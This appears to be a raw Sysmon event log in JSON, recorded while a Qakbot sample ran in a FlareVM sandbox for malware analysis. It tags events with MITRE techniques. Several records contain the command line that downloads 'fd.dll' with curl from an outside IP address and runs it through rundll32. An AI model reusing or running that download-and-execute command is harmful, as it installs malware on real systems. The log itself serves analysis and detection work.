{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.834Z","TimeGenerated":"2023-03-02T04:38:06.834Z","EventRecordID":"57625","EventID":1,"Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-03-02 16:38:06.826\r\nProcessGuid: {159466bb-d0ee-6400-4401-000000000f00}\r\nProcessId: 1808\r\nImage: C:\\Windows\\SysWOW64\\curl.exe\r\nFileVersion: 7.83.1\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: curl  -o fd.dll http://64.225.8.202/1Moch7/160223 \r\nCurrentDirectory: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\r\nUser: FLAREVM\\malware\r\nLogonGuid: {159466bb-cd20-6400-d5fd-0d0000000000}\r\nLogonId: 0xDFDD5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=6EDAE73E36B61B261369717EA3657A6783EBA872,MD5=44E5BAEEE864F1E9EDBE3986246AB37A,SHA256=4BCA545DD0DEAC696838C6338BA66A934426A34CE43D136D2750436F31E6BAFB,IMPHASH=FC799C0F8A0C16C28C597E4FC70B806C\r\nParentProcessGuid: {159466bb-d0ee-6400-4201-000000000f00}\r\nParentProcessId: 9328\r\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115\r\nParentUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1059,technique_name=Command-Line Interface\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.826\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4401-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1808\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\curl.exe\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e7.83.1\u003c/Data\u003e\u003cData Name=\"Description\"\u003eThe curl executable\u003c/Data\u003e\u003cData Name=\"Product\"\u003eThe curl executable\u003c/Data\u003e\u003cData Name=\"Company\"\u003ecurl, https://curl.se/\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003ecurl.exe\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003ecurl  -o fd.dll http://64.225.8.202/1Moch7/160223 \u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{159466bb-cd20-6400-d5fd-0d0000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e0xdfdd5\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e1\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eMedium\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=6EDAE73E36B61B261369717EA3657A6783EBA872,MD5=44E5BAEEE864F1E9EDBE3986246AB37A,SHA256=4BCA545DD0DEAC696838C6338BA66A934426A34CE43D136D2750436F31E6BAFB,IMPHASH=FC799C0F8A0C16C28C597E4FC70B806C\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{159466bb-d0ee-6400-4201-000000000f00}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e9328\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003eC:\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003e\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026amp;\u0026amp; rundll32 fd.dll,N115\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":1,"RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-03-02 16:38:06.826","ProcessGuid":"159466bb-d0ee-6400-4401-000000000f00","ProcessId":1808,"Image":"C:\\Windows\\SysWOW64\\curl.exe","FileVersion":"7.83.1","Description":"The curl executable","Product":"The curl executable","Company":"curl, https://curl.se/","OriginalFileName":"curl.exe","CommandLine":"curl  -o fd.dll http://64.225.8.202/1Moch7/160223 ","CurrentDirectory":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\","User":"FLAREVM\\malware","LogonGuid":"159466bb-cd20-6400-d5fd-0d0000000000","LogonId":"0xdfdd5","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"SHA1=6EDAE73E36B61B261369717EA3657A6783EBA872,MD5=44E5BAEEE864F1E9EDBE3986246AB37A,SHA256=4BCA545DD0DEAC696838C6338BA66A934426A34CE43D136D2750436F31E6BAFB,IMPHASH=FC799C0F8A0C16C28C597E4FC70B806C","ParentProcessGuid":"159466bb-d0ee-6400-4201-000000000f00","ParentProcessId":9328,"ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115","ParentUser":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.959Z","TimeGenerated":"2023-03-02T04:38:06.959Z","EventRecordID":"57626","EventID":11,"Message":"File created:\r\nRuleName: -\r\nUtcTime: 2023-03-02 16:38:06.957\r\nProcessGuid: {159466bb-d0ee-6400-4401-000000000f00}\r\nProcessId: 1808\r\nImage: C:\\Windows\\SysWOW64\\curl.exe\r\nTargetFilename: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\fd.dll\r\nCreationUtcTime: 2023-03-02 16:38:06.957\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.957\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4401-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1808\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\curl.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\fd.dll\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:06.957\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"-","UtcTime":"2023-03-02 16:38:06.957","ProcessGuid":"159466bb-d0ee-6400-4401-000000000f00","ProcessId":1808,"Image":"C:\\Windows\\SysWOW64\\curl.exe","TargetFilename":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\fd.dll","CreationUtcTime":"2023-03-02 16:38:06.957","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.979Z","TimeGenerated":"2023-03-02T04:38:06.979Z","EventRecordID":"57627","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness\r\nUtcTime: 2023-03-02 16:38:06.973\r\nProcessGuid: {159466bb-a9f3-63f7-2800-000000000f00}\r\nProcessId: 1888\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\CURL.EXE-1F273377.pf\r\nCreationUtcTime: 2023-03-02 16:38:06.973\r\nUser: NT AUTHORITY\\SYSTEM","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1574.010,technique_name=Services File Permissions Weakness\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.973\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-a9f3-63f7-2800-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1888\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Windows\\Prefetch\\CURL.EXE-1F273377.pf\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:06.973\u003c/Data\u003e\u003cData Name=\"User\"\u003eNT AUTHORITY\\SYSTEM\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1574.010,technique_name=Services File Permissions Weakness","UtcTime":"2023-03-02 16:38:06.973","ProcessGuid":"159466bb-a9f3-63f7-2800-000000000f00","ProcessId":1888,"Image":"C:\\Windows\\system32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\CURL.EXE-1F273377.pf","CreationUtcTime":"2023-03-02 16:38:06.973","User":"NT AUTHORITY\\SYSTEM"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:06.982Z","TimeGenerated":"2023-03-02T04:38:06.982Z","EventRecordID":"57628","EventID":1,"Message":"Process Create:\r\nRuleName: technique_id=T1218.002,technique_name=rundll32.exe\r\nUtcTime: 2023-03-02 16:38:06.981\r\nProcessGuid: {159466bb-d0ee-6400-4501-000000000f00}\r\nProcessId: 8108\r\nImage: C:\\Windows\\SysWOW64\\rundll32.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows host process (Rundll32)\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: RUNDLL32.EXE\r\nCommandLine: rundll32  fd.dll,N115\r\nCurrentDirectory: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\r\nUser: FLAREVM\\malware\r\nLogonGuid: {159466bb-cd20-6400-d5fd-0d0000000000}\r\nLogonId: 0xDFDD5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=8FA889E456AA646A4D0A4349977430CE5FA5E2D7,MD5=889B99C52A60DD49227C5E485A016679,SHA256=6CBE0E1F046B13B29BFA26F8B368281D2DDA7EB9B718651D5856F22CC3E02910,IMPHASH=30B6D4AA5B2B125B0ABCA749B5D12B3A\r\nParentProcessGuid: {159466bb-d0ee-6400-4201-000000000f00}\r\nParentProcessId: 9328\r\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115\r\nParentUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1218.002,technique_name=rundll32.exe\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:06.981\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4501-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e8108\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\rundll32.exe\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e10.0.19041.746 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eWindows host process (Rundll32)\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft® Windows® Operating System\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003eRUNDLL32.EXE\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003erundll32  fd.dll,N115\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{159466bb-cd20-6400-d5fd-0d0000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e0xdfdd5\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e1\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eMedium\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=8FA889E456AA646A4D0A4349977430CE5FA5E2D7,MD5=889B99C52A60DD49227C5E485A016679,SHA256=6CBE0E1F046B13B29BFA26F8B368281D2DDA7EB9B718651D5856F22CC3E02910,IMPHASH=30B6D4AA5B2B125B0ABCA749B5D12B3A\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{159466bb-d0ee-6400-4201-000000000f00}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e9328\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003eC:\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003e\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026amp;\u0026amp; rundll32 fd.dll,N115\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":1,"RuleName":"technique_id=T1218.002,technique_name=rundll32.exe","UtcTime":"2023-03-02 16:38:06.981","ProcessGuid":"159466bb-d0ee-6400-4501-000000000f00","ProcessId":8108,"Image":"C:\\Windows\\SysWOW64\\rundll32.exe","FileVersion":"10.0.19041.746 (WinBuild.160101.0800)","Description":"Windows host process (Rundll32)","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"RUNDLL32.EXE","CommandLine":"rundll32  fd.dll,N115","CurrentDirectory":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\","User":"FLAREVM\\malware","LogonGuid":"159466bb-cd20-6400-d5fd-0d0000000000","LogonId":"0xdfdd5","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"SHA1=8FA889E456AA646A4D0A4349977430CE5FA5E2D7,MD5=889B99C52A60DD49227C5E485A016679,SHA256=6CBE0E1F046B13B29BFA26F8B368281D2DDA7EB9B718651D5856F22CC3E02910,IMPHASH=30B6D4AA5B2B125B0ABCA749B5D12B3A","ParentProcessGuid":"159466bb-d0ee-6400-4201-000000000f00","ParentProcessId":9328,"ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115","ParentUser":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:13.344Z","TimeGenerated":"2023-03-02T04:38:13.344Z","EventRecordID":"57629","EventID":13,"Message":"Registry value set:\r\nRuleName: technique_id=T1543,technique_name=Service Creation\r\nEventType: SetValue\r\nUtcTime: 2023-03-02 16:38:13.336\r\nProcessGuid: {159466bb-d0ee-6400-4501-000000000f00}\r\nProcessId: 8108\r\nImage: C:\\Windows\\SysWOW64\\rundll32.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\rundll32.exe\r\nDetails: Binary Data\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1543,technique_name=Service Creation\u003c/Data\u003e\u003cData Name=\"EventType\"\u003eSetValue\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:13.336\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4501-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e8108\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\rundll32.exe\u003c/Data\u003e\u003cData Name=\"TargetObject\"\u003eHKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\rundll32.exe\u003c/Data\u003e\u003cData Name=\"Details\"\u003eBinary Data\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":13,"RuleName":"technique_id=T1543,technique_name=Service Creation","EventType":"SetValue","UtcTime":"2023-03-02 16:38:13.336","ProcessGuid":"159466bb-d0ee-6400-4501-000000000f00","ProcessId":8108,"Image":"C:\\Windows\\SysWOW64\\rundll32.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\rundll32.exe","Details":"Binary Data","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:13.345Z","TimeGenerated":"2023-03-02T04:38:13.345Z","EventRecordID":"57630","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness\r\nUtcTime: 2023-03-02 16:38:13.336\r\nProcessGuid: {159466bb-a9f3-63f7-2800-000000000f00}\r\nProcessId: 1888\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\RUNDLL32.EXE-D86D67D5.pf\r\nCreationUtcTime: 2023-03-02 16:38:13.336\r\nUser: NT AUTHORITY\\SYSTEM","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1574.010,technique_name=Services File Permissions Weakness\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:13.336\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-a9f3-63f7-2800-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1888\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Windows\\Prefetch\\RUNDLL32.EXE-D86D67D5.pf\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:13.336\u003c/Data\u003e\u003cData Name=\"User\"\u003eNT AUTHORITY\\SYSTEM\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1574.010,technique_name=Services File Permissions Weakness","UtcTime":"2023-03-02 16:38:13.336","ProcessGuid":"159466bb-a9f3-63f7-2800-000000000f00","ProcessId":1888,"Image":"C:\\Windows\\system32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\RUNDLL32.EXE-D86D67D5.pf","CreationUtcTime":"2023-03-02 16:38:13.336","User":"NT AUTHORITY\\SYSTEM"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:13.346Z","TimeGenerated":"2023-03-02T04:38:13.346Z","EventRecordID":"57631","EventID":13,"Message":"Registry value set:\r\nRuleName: technique_id=T1543,technique_name=Service Creation\r\nEventType: SetValue\r\nUtcTime: 2023-03-02 16:38:13.336\r\nProcessGuid: {159466bb-d0ee-6400-4201-000000000f00}\r\nProcessId: 9328\r\nImage: C:\\Windows\\SysWOW64\\cmd.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\cmd.exe\r\nDetails: Binary Data\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1543,technique_name=Service Creation\u003c/Data\u003e\u003cData Name=\"EventType\"\u003eSetValue\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:13.336\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0ee-6400-4201-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e9328\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"TargetObject\"\u003eHKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"Details\"\u003eBinary Data\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":13,"RuleName":"technique_id=T1543,technique_name=Service Creation","EventType":"SetValue","UtcTime":"2023-03-02 16:38:13.336","ProcessGuid":"159466bb-d0ee-6400-4201-000000000f00","ProcessId":9328,"Image":"C:\\Windows\\SysWOW64\\cmd.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\cmd.exe","Details":"Binary Data","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:13.347Z","TimeGenerated":"2023-03-02T04:38:13.347Z","EventRecordID":"57632","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1574.010,technique_name=Services File Permissions Weakness\r\nUtcTime: 2023-03-02 16:38:13.336\r\nProcessGuid: {159466bb-a9f3-63f7-2800-000000000f00}\r\nProcessId: 1888\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Windows\\Prefetch\\CMD.EXE-6D6290C5.pf\r\nCreationUtcTime: 2023-03-02 16:38:13.336\r\nUser: NT AUTHORITY\\SYSTEM","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1574.010,technique_name=Services File Permissions Weakness\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:13.336\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-a9f3-63f7-2800-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e1888\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\system32\\svchost.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Windows\\Prefetch\\CMD.EXE-6D6290C5.pf\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:13.336\u003c/Data\u003e\u003cData Name=\"User\"\u003eNT AUTHORITY\\SYSTEM\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1574.010,technique_name=Services File Permissions Weakness","UtcTime":"2023-03-02 16:38:13.336","ProcessGuid":"159466bb-a9f3-63f7-2800-000000000f00","ProcessId":1888,"Image":"C:\\Windows\\system32\\svchost.exe","TargetFilename":"C:\\Windows\\Prefetch\\CMD.EXE-6D6290C5.pf","CreationUtcTime":"2023-03-02 16:38:13.336","User":"NT AUTHORITY\\SYSTEM"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:14.631Z","TimeGenerated":"2023-03-02T04:38:14.631Z","EventRecordID":"57633","EventID":11,"Message":"File created:\r\nRuleName: technique_id=T1059.007,technique_name=JavaScript\r\nUtcTime: 2023-03-02 16:38:14.629\r\nProcessGuid: {159466bb-cd30-6400-ca00-000000000f00}\r\nProcessId: 9336\r\nImage: C:\\Program Files\\Mozilla Firefox\\firefox.exe\r\nTargetFilename: C:\\Users\\malware\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qw6cdr4z.default-release\\prefs-1.js\r\nCreationUtcTime: 2023-03-02 16:38:14.629\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1059.007,technique_name=JavaScript\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:14.629\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-cd30-6400-ca00-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e9336\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Program Files\\Mozilla Firefox\\firefox.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Users\\malware\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qw6cdr4z.default-release\\prefs-1.js\u003c/Data\u003e\u003cData Name=\"CreationUtcTime\"\u003e2023-03-02 16:38:14.629\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":11,"RuleName":"technique_id=T1059.007,technique_name=JavaScript","UtcTime":"2023-03-02 16:38:14.629","ProcessGuid":"159466bb-cd30-6400-ca00-000000000f00","ProcessId":9336,"Image":"C:\\Program Files\\Mozilla Firefox\\firefox.exe","TargetFilename":"C:\\Users\\malware\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\qw6cdr4z.default-release\\prefs-1.js","CreationUtcTime":"2023-03-02 16:38:14.629","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:14.632Z","TimeGenerated":"2023-03-02T04:38:14.632Z","EventRecordID":"57634","EventID":23,"Message":"File Delete archived:\r\nRuleName: Scripts and payloads\r\nUtcTime: 2023-03-02 16:38:14.629\r\nProcessGuid: {159466bb-cd30-6400-ca00-000000000f00}\r\nProcessId: 9336\r\nUser: FLAREVM\\malware\r\nImage: C:\\Program Files\\Mozilla Firefox\\firefox.exe\r\nTargetFilename: 